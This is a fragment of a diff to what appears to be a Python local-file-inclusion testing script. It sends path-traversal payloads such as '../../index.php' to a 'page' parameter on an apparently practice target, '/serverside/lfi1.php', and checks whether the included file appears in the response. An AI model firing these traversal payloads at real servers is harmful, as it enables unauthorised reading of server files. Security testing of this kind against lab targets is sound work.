@@ -23,6 +23,7 @@ def injectPayload(url, paramname, method, payload):
 def checkSuccess(html):
 #server side injection:
 
+	print html
 	#included index.php
 	indexPHP = requests.get(BASE_URL + "index.php")
 	if indexPHP.text in html:
@@ -37,4 +38,4 @@ if __name__ == "__main__":
 	
 	url = "/serverside/lfi1.php"
 	payload = "../../index.php"
-	injectPayload(url, "page", "GET", "../../index")
+	injectPayload(url, "page", "GET", "../../eval")
